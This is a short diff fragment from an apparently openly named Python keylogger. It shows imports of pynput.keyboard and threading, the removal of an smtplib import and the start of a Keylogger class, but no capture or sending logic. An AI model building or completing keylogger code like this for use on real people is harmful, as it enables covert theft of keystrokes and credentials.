@@ -1,6 +1,5 @@
 import pynput.keyboard
 import threading
-import smtplib
 
 
 class Keylogger:
